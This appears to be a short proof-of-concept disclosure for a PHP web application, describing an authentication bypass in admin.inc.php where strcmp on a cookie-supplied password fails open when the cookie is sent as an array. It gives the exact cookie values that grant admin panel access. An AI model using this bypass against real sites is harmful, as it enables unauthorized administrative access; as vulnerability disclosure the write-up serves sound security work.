Proof of Concept

File: admin.inc.php
Line: 187
Code: (strcmp($aProfile['Password'], $passwd) != 0)

$passwd is equal to Cookie parameter memberpassword

Bug:
According to PHP documentation strcmp will compare strings, but what if we provide an array???

So, simple bypass is to put two cookies in browser
memberID=1
memberPassword[]=blah --->array

This will allow the attacker to bypass the authentication and can also enter in admin panel.
